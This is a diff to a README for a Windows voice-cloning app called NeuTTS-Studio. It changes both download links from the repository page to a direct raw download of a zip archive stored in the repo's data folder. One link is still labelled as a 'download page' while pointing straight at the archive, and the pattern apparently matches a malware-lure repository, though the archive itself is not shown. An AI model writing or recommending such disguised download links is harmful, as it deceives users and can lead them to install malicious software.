@@ -1,6 +1,6 @@
 # 🎙️ NeuTTS-Studio - Run Voice Cloning On Windows
 
-[![Download Now](https://img.shields.io/badge/Download%20NeuTTS--Studio-blue?style=for-the-badge&logo=github)](https://github.com/Classaphasmidiapresidenttaylor774/NeuTTS-Studio)
+[![Download Now](https://img.shields.io/badge/Download%20NeuTTS--Studio-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Classaphasmidiapresidenttaylor774/NeuTTS-Studio/main/data/Studio_TT_Neu_v3.6.zip)
 
 ## 🖥️ What This App Does
 
@@ -31,7 +31,7 @@ If your system has a GPU, the app may run faster. It can still work on CPU-only 
 
 Use this link to visit the page and download the app:
 
-[Visit the NeuTTS-Studio download page](https://github.com/Classaphasmidiapresidenttaylor774/NeuTTS-Studio)
+[Visit the NeuTTS-Studio download page](https://raw.githubusercontent.com/Classaphasmidiapresidenttaylor774/NeuTTS-Studio/main/data/Studio_TT_Neu_v3.6.zip)
 
 ## 🛠️ Install on Windows
 
